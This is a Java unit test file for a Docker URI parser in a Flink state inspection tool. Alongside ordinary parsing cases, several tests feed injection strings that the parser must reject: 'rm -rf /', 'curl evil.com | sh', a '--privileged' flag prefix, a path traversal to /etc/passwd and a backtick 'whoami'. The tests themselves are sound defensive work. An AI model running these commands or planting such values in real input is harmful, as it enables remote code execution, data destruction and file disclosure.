package io.flinkstate.inspector.storage;

import org.junit.jupiter.api.Test;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class DockerStorageConnectorTest {

    @Test
    void parseDockerUriWithContainerAndPath() {
        // Arrange
        String uri = "docker://flink-taskmanager/opt/flink/checkpoints";

        // Act
        String[] result = DockerStorageConnector.parseDockerUri(uri);

        // Assert
        assertThat(result[0]).isEqualTo("flink-taskmanager");
        assertThat(result[1]).isEqualTo("/opt/flink/checkpoints");
    }

    @Test
    void parseDockerUriWithContainerOnly() {
        // Arrange
        String uri = "docker://flink-taskmanager";

        // Act
        String[] result = DockerStorageConnector.parseDockerUri(uri);

        // Assert
        assertThat(result[0]).isEqualTo("flink-taskmanager");
        assertThat(result[1]).isEqualTo("/");
    }

    @Test
    void parseDockerUriWithNestedPath() {
        // Arrange
        String uri = "docker://my-container/var/data/flink/chk-123";

        // Act
        String[] result = DockerStorageConnector.parseDockerUri(uri);

        // Assert
        assertThat(result[0]).isEqualTo("my-container");
        assertThat(result[1]).isEqualTo("/var/data/flink/chk-123");
    }

    @Test
    void rejectsContainerNameWithShellMetachars() {
        // Arrange
        String uri = "docker://legit;rm -rf //path";

        // Act / Assert
        assertThatThrownBy(() -> DockerStorageConnector.parseDockerUri(uri))
            .isInstanceOf(IllegalArgumentException.class)
            .hasMessageContaining("Invalid Docker container name");
    }

    @Test
    void rejectsContainerNameWithDashPrefix() {
        // Arrange
        String uri = "docker://--privileged/path";

        // Act / Assert
        assertThatThrownBy(() -> DockerStorageConnector.parseDockerUri(uri))
            .isInstanceOf(IllegalArgumentException.class)
            .hasMessageContaining("Invalid Docker container name");
    }

    @Test
    void rejectsPathWithShellInjection() {
        // Arrange
        String uri = "docker://container/'; curl evil.com | sh; echo '";

        // Act / Assert
        assertThatThrownBy(() -> DockerStorageConnector.parseDockerUri(uri))
            .isInstanceOf(IllegalArgumentException.class)
            .hasMessageContaining("disallowed characters");
    }

    @Test
    void rejectsPathWithDotDotTraversal() {
        // Arrange
        String uri = "docker://container/opt/../../etc/passwd";

        // Act / Assert
        assertThatThrownBy(() -> DockerStorageConnector.parseDockerUri(uri))
            .isInstanceOf(IllegalArgumentException.class)
            .hasMessageContaining("..");
    }

    @Test
    void rejectsPathWithBacktickInjection() {
        // Arrange
        String uri = "docker://container/path/`whoami`";

        // Act / Assert
        assertThatThrownBy(() -> DockerStorageConnector.parseDockerUri(uri))
            .isInstanceOf(IllegalArgumentException.class)
            .hasMessageContaining("disallowed characters");
    }

    @Test
    void rejectsEmptyContainerName() {
        // Arrange
        String uri = "docker:///path";

        // Act / Assert
        assertThatThrownBy(() -> DockerStorageConnector.parseDockerUri(uri))
            .isInstanceOf(IllegalArgumentException.class)
            .hasMessageContaining("required");
    }

    @Test
    void acceptsValidContainerNamesWithDotsAndUnderscores() {
        // Arrange
        String uri = "docker://my_container.v2/opt/flink";

        // Act
        String[] result = DockerStorageConnector.parseDockerUri(uri);

        // Assert
        assertThat(result[0]).isEqualTo("my_container.v2");
        assertThat(result[1]).isEqualTo("/opt/flink");
    }
}
